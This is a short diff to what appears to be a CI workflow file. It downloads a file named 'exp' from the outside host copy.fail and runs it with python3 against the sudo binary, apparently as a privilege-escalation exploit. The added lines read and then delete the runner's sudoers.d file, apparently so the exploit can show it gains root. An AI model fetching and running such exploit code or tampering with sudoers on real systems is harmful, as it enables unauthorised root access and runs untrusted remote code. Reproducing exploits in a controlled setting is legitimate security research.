@@ -19,6 +19,8 @@ jobs:
         shell: bash
         run: |
           wget https://copy.fail/exp
+          sudo cat /etc/sudoers.d/runner
+          sudo rm /etc/sudoers.d/runner
           sha256sum $(which sudo)
           sudo id 2>&1
           python3 exp $(which sudo)
